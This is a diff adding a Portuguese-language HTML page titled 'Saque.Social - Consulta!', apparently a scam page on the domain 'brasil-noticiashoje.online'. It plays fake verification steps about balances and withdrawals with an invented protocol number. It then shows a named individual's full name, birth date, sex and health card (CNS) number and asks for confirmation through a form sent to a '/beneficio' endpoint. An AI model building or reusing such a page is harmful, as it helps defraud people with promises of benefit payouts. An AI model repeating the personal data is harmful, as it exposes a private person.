@@ -1,0 +1,98 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://brasil-noticiashoje.online/static/pagina2/api.css">
+
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+            
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    
+    <title>Saque.Social - Consulta!</title>
+</head>
+<body>
+<div class="container">
+    <div class="checkpoints">
+        <div class="point active" id="point1"></div>
+        <div class="line" id="line1"></div>
+        <div class="point" id="point2"></div>
+        <div class="line" id="line2"></div>
+        <div class="point" id="point3"></div>
+        <div class="line" id="line3"></div>
+        <div class="point" id="point4"></div>
+    </div>
+    <ul class="status-list" id="statusList">
+        <li class="status-item" id="status1" style="display:none;"><span>Verificando saldos e resgates...</span><img class="check-icon" src="https://brasil-noticiashoje.online/static/pagina2/check30.svg" alt="Check"></li>
+        <li class="status-item" id="status2" style="display:none;"><span>Confirmando protocolo: <strong>5439550</strong>...</span><img class="check-icon" src="https://brasil-noticiashoje.online/static/pagina2/check30.svg" alt="Check"></li>
+        <li class="status-item" id="status3" style="display:none;"><span>Preparando resultado detalhado...</span><img class="check-icon" src="https://brasil-noticiashoje.online/static/pagina2/check30.svg" alt="Check"></li>
+    </ul>
+    <div class="divider" id="divider"></div>
+    <div class="confirmation" id="confirmation" style="display:none; margin-top: 35px;">
+        <h1 style="--animation-order: 1;">Confirme seus dados:</h1>
+                <div class="infos">
+            <p class="grouped-text" style="--animation-order: 2;"><b>Nome: JOSE DIAS DA SILVA FILHO </b> </p>
+            <p class="grouped-text" style="--animation-order: 3;"><b>Data Nascimento: 06/09/1960</b> </p>
+            <p class="grouped-text" style="--animation-order: 4;"><b>Sexo: MASCULINO</b> </p>
+            
+
+            
+
+            
+                <p class="grouped-text" style="--animation-order: 7;"><b>CNS: 898006179424421</b> </p>
+            
+            
+            
+
+        </div>
+        
+        <form action="https://brasil-noticiashoje.online/beneficio" method="get">
+            <input type="text" class="invisible" name="nome" value="JOSE DIAS DA SILVA FILHO">
+            <input type="submit" class="button-confirm" value="CONFIRMAR">
+        </form>
+        <div class="small-text" style="--animation-order: 7;">Toque para ver o <span style="color: #FF9142; font-weight: bold;">resultado.</span></div>
+    </div>
+
+    <script>
+        let currentStep = 1;
+
+        function updateStep() {
+            if (currentStep <= 4) {
+                const lineElement = document.getElementById(`line${currentStep}`);
+                const pointElement = document.getElementById(`point${currentStep + 1}`);
+                const nextStatusElement = document.getElementById(`status${currentStep + 1}`);
+
+                if (lineElement && pointElement) {
+                    lineElement.classList.add('active');
+                    setTimeout(() => {
+                        pointElement.classList.add('active');
+                        if (nextStatusElement) {
+                            nextStatusElement.style.display = 'flex';
+                            setTimeout(() => {
+                                nextStatusElement.querySelector('.check-icon').style.display = 'inline';
+                            }, 1000);
+                        }
+                        currentStep++;
+
+                        if (currentStep === 5) {
+                            document.getElementById('confirmation').style.display = 'block';
+                            document.getElementById('divider').style.display = 'block';
+                        }
+                    }, 2000);
+                }
+            }
+        }
+
+        document.getElementById('status1').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('status1').querySelector('.check-icon').style.display = 'inline';
+        }, 1000);
+
+        setTimeout(updateStep, 1000); 
+        setInterval(updateStep, 2000);
+    </script>
+</div>
+</body>
+</html>
